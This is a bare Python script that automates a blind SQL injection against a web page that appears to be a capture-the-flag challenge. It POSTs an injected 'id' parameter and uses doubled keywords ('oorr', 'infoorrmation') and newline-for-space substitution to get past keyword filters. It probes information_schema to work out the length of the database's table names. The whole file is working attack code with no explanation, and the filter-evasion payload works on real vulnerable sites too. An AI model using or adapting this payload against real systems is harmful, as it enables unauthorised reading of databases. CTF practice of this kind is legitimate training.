#!/usr/bin/python

import requests
str = "You are in"
url = "http://ctf5.shiyanbar.com/web/earnest/index.php"
guess = "abcdefghijklmnopqrstuvwxyz0123456789~+=-*/\{}?!:@#$&[]."
i = 1
print("start")
while True:
    res = "0'oorr((select(mid(group_concat(table_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())='')oorr'0" % i
    res = res.replace(' ',chr(0x0a))
    key = {'id':res}
    r = requests.post(url,data=key).text
    print(i)
    if str in r:
        print(r)
        print("length: %s"%i)
        break
    i+=1
print("end!")
